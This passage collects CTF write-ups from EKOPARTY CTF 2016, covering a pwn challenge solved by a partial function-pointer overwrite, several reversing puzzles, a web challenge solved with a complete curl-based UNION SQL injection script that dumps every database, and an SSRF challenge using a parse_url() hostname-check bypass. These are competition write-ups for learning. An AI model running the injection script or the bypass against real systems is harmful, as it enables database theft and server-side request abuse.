lea     rdi, aWelcomeGiveMeY ; "Welcome, give me you best shot"
call    puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    fflush
lea     rax, [rbp+buf]
mov     edx, 19h        ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    read
mov     rax, cs:stdin@@GLIBC_2_2_5
mov     rdi, rax        ; stream
call    fflush
mov     rdx, [rbp+fp]
mov     eax, 0
call    rdx
mov     eax, 0
leave
retn
main endp

```

`buf` lives on the stack 0x20 bytes below the frame pointer, and a function pointer (I named it `fp`) lives `0x8` bytes below the frame pointer. We can read `0x19` bytes from standard input into the buffer, so we can overwrite the function pointer before it's dereferenced and called. It's supposed to point to `Bye`, but we want it to point to `Flag`.

The binary is compiled w/ PIE, so we don't know a priori what the address of `Flag` is. However, x86 is little-endian, which means if we do a short overwrite, we can modify just the lower-order bytes of the pointer, leaving the higher-order bytes intact. This is just what we need, since `Flag` and `Bye` are in the same page, but we don't know where that page is.

```
$ echo -e "aaaaaaaaaaaaaaaaaaaaaaaa\xf3" | nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 55000
Welcome, give me you best shot
EKO{Welcome_to_pwning_challs_2k16}
```

(`0xf3` is the least significant byte in the page offset of `Flag`.)



### File: writeups/EKOPARTY-CTF-2016/Reversing/Back again/readme.md

# Back again - Reversing 150

```
There are no disassemblers for this kind of program or this is what we think, can you proof otherwise?

Attachment
rev150_9f0cc9207d9c580d.zip
```

The same trick used in Old times worked here, too, except this time the bytes were scrambled around a bit. I just had to manually rearrange things with my eyeballs. Love when that happens. I didn't even have to go back in time to the 80's and ask the bank if I could borrow their AS/400.

![The flag, scrambled](flag.png)

`EKO{c0b0l_l33t_ekoparty_pgm_ftw}`

Surprisingly few people solved this, given that you could basically do this by dumping the file and eyeballing for strings.



### File: writeups/EKOPARTY-CTF-2016/Reversing/F#ck/readme.md

# F#ck - Reversing 50

```
The miracle of the expressive functional programming, is it really functional?

Attachment
rev50_3511a8cd66b371eb.zip 
```

The challenged is called F#ck, as in F#, Micro$oft's OCaml-inspired programming language for .NET. After installing `fsharp` on Ubuntu,

```
$ mono FlagGenerator.exe
Usage: FlagGenerator.exe <FLAG>
$ mono FlagGenerator.exe blah
BAD ANSWER
```

I burned some time trying to build the Mono debugger, sdb (the one in the Ubuntu repos was old and didn't seem to support the `args` command), but was having dependency problems that really aren't any fun. Instead, I picked up [ILSpy](http://ilspy.net/), an open source .NET decompiler. Again I had problems running it under Mono, but I just punted on the problem and ran it in a Windows VM instead:

```
// Program
[EntryPoint]
public static int main(string[] argv)
{
	if (argv.Length != 1)
	{
		ExtraTopLevelOperators.PrintFormatLine<Unit>(new PrintfFormat<Unit, TextWriter, Unit, Unit, Unit>("Usage: FlagGenerator.exe <FLAG>"));
	}
	else
	{
		string text = Program.get_flag("t#hs_siht_kc#f");
		if (string.Equals(text, argv[0]))
		{
			FSharpFunc<string, Unit> fSharpFunc = ExtraTopLevelOperators.PrintFormatLine<FSharpFunc<string, Unit>>(new PrintfFormat<FSharpFunc<string, Unit>, TextWriter, Unit, Unit, string>("EKO{%s}"));
			string text2 = text;
			fSharpFunc.Invoke(text2);
		}
		else
		{
			ExtraTopLevelOperators.PrintFormatLine<Unit>(new PrintfFormat<Unit, TextWriter, Unit, Unit, Unit>("BAD ANSWER"));
		}
	}
	return 0;
}
```

There's also a `get_flag` function, but who cares? We can see the string constant `t#hs_siht_kc#f`, which is `f#ck_this_sh#t` backwards.

```
$ mono FlagGenerator.exe 'f#ck_this_sh#t'
EKO{f#ck_this_sh#t}
```



### File: writeups/EKOPARTY-CTF-2016/Reversing/JVM/readme.md

# JVM - Reversing 25

```
Bytecodes everywhere, reverse them.

Attachment
rev25_3100aa76fca4432f.zip 
```

Running the "binary" isn't very illustrative, but JD-GUI gives us this:

```
public class EKO
{
  public static void main(String[] paramArrayOfString)
  {
    int i = 0;
    for (int j = 0; j < 1337; j++) {
      i += j;
    }
    String str = "EKO{" + i + "}";
  }
}
```

So the flag is the sum 0 + 1 + ... + 1336, which is given by n (n + 1) / 2, where n is 1336 (remember Calc II?). So the flag is `EKO{893116}`. Cheers!



### File: writeups/EKOPARTY-CTF-2016/Reversing/Old times/readme.md

# Old times - Reversing 100

```
Grace Hopper will be proud of you! Don't let her down!

Attachment
rev100_62f48362bc4a0397.zip 
```

This one was a hacketedy hack in the truest sense. We're given some kind of save file from an IBM AS/400 system. The first thing I'd like to do is dig around w/ `strings`, `grep` or `xxd`, but it's probably EBCDIC-encoded, so I'll need a converter of some sort. This CTF was pretty good, so I just moved on to another problem rather than Googling for tools (booooring!).

I was using Wireshark for a different problem when I was reminded that its stream view can interpret streams as EBCDIC text.

![Decoding EBCDIC with Wireshark](wireshark-ebcdic.png)

*To get here, right click a TCP segment and select "Follow TCP stream." You can then choose to decode the stream in a handful of different ways, including EBCDIC.*

Using netcat, I sent the file to myself over the loopback interface, and sniffed the connection in Wireshark. Even when interpreted as EBCDIC, the file isn't plain text, but Wireshark's stream view gives us something quick and dirty:

![The flag](flag.png)

Boom.



### File: writeups/EKOPARTY-CTF-2016/Reversing/RrEeGgEeXx/readme.md

# RrEeGgEeXx - Reversing 75

```
State-of-the-art on authentication mechanisms.

Attachment
rev75_79816641bfd11577.zip 
```

Another .NET binary. ILSpy gives us:

```
// RegexAuth.Program
private static void Main(string[] args)
{
	Console.WriteLine("EKO AUTH CHECKER");
	Console.WriteLine("----------------");
	Console.Write("Password: ");
	string input = Console.ReadLine();
	if (Program.check_regex("^.{40}$", input) && Program.check_regex("\\w{3}\\{.*\\}", input) && Program.check_regex("_s.*e_", input) && Program.check_regex("\\{o{2}O{2}o{2}", input) && Program.check_regex("O{2}o{2}O{2}\\}", input) && Program.check_regex("sup3r_r3g3x_challenge", input))
	{
		Console.WriteLine("Welcome master");
		return;
	}
	Console.WriteLine("IMPOSTOR");
}
```

(`check_regex` is just a thin wrapper for the .NET regex stuff.)

So we need to find a string that matches all of these:

```
^.{40}$
\w{3}\{.*\}
_s.*e_
\{o{2}O{2}o{2}
O{2}o{2}O{2}\}
sup3r_r3g3x_challenge
```

After some fiddling, this works:

```
$ mono RegexAuth.exe
EKO AUTH CHECKER
----------------
Password: _sup3r_r3g3x_challenge_{ooOOooOO}aaaaaaa
Welcome master
```

I wrapped it in `EKO{}` and submitted it, but it's not the flag. Obviously we can substitute `aaaaaaa` with 7 characters we like. We can also rearrange some things and still get the "Welcome master" message.  So we'll need to dig deeper.

Look at `\w{3}\{.*\}`. In .NET, `\w` matches any alphanumeric character. So it seems like this regex might be asking us for something more like `EKO\{.*\}`. I then shifted some things around and came up with `EKO{ooOOoo_sup3r_r3g3x_challenge_OOooOO}`, which is 40 characters long. Bingo!



### File: writeups/EKOPARTY-CTF-2016/Web/Super duper advanced attack/readme.md

# Super duper advanced attack

```
Can you find the flag?

http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000

Hint
You don't need to search for the flag outside the DB, there is more than tables and columns in a DB. 
```

It's a web application with a form that lets us search for users by their username. It seems to be using MySQL's `LIKE` feature, as it returns a user even when you only search for a substring of their name. The server is down as I'm writing this, so I don't have a minimal payload exmaple, sorry.

I wrote a script to dump the whole db, column-by column, using UNION queries on information_schema:


```
#!/bin/sh

URL='http://0491e9f58d3c2196a6e1943adef9a9ab734ff5c9.ctf.site:20000/'

query() {
	curl --silent --data-urlencode "username=blah%' union select 1337, $3 from $1.$2 where $4 and $5 like '%$6" "$URL"  
}

scrape() {
	grep -A 1 --no-group-separator '<td>' |
	grep -v '<td>' |
	grep -v 1337 |
	sed 's/^[[:space:]]*//'
}

query_dbs() {
	query information_schema schemata schema_name '1=1' schema_name 
}

query_tables() {
	query information_schema tables table_name '1=1' table_schema "$1" 
}

query_columns() {
	query information_schema columns column_name "table_schema='$1'" table_name "$2" 
}

query_values() {
	query "$1" "$2" "$3" '1=1' "$3" 
}

query_expression() {
	query information_schema schemata "$1" '1=1' schema_name information_schema
}

query_dbs | scrape |
while read db
do
	query_tables "$db" | scrape | 
	while read table
	do
		query_columns "$db" "$table" | scrape |
		while read column
		do
			echo "$db" "$table" "$column"
			query_values "$db" "$table" "$column" | scrape
			echo
		done
	done
done
```

However, the flag wasn't in there!!! wtf? A lot of other people were having trouble with this, too. Eventually, however, I tried this:

```
$ query_expression @flag | scrape
EKO{do_not_forget_session_variables}
```



### File: writeups/EKOPARTY-CTF-2016/Web/Url shortener/readme.md

# Url shortener - Web 200

```
We developed this url shortener, it will allow you to share links with your friends!

http://9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site:20000/

Hint
You will need to bypass the check for the hostname and send the request somewhere else!
Source code: https://paste.null-life.com/#/sGv1ZrIyhAAYCQMa6p8UFm2IFvzZhJ9yAYtkHgCcCz7bu8YE/66lTyw0 
```

It's a URL shortener, basically (except it doesn't actually work, but that doesn't matter for this challenge). The key is that you are only supposed to sorten url's that point to the ctf.ekoparty.org main site.

[Here](index.php)'s the source. There isn't an obvious vuln. However, the app makes a request to whatever URL you provide (as long as it passes the hostname check), and it puts the flag in the user agent. Then, whatever the page sets as its `<title>` is shown to the user. Since the URL is supposed to be restricted to ctf.ekoparty.org, I thought maybe there was an easter egg somewhere on the main site where the user agent gets reflected in the `<title>`. However, a quick scan with `wget` came up empty-handed.

Some Googling revealed [this](https://bugs.php.net/bug.php?id=73192) PHP vuln from September. Basically you can trick `parse_url()` (the function performing the hostname check) with a URL like this: `http://example.com:80#@ctf.ekoparty.org/`.

I set up a netcat listener on the Internet somewhere, and:

```
EKO{follow_the_rfc_rabbit}
```

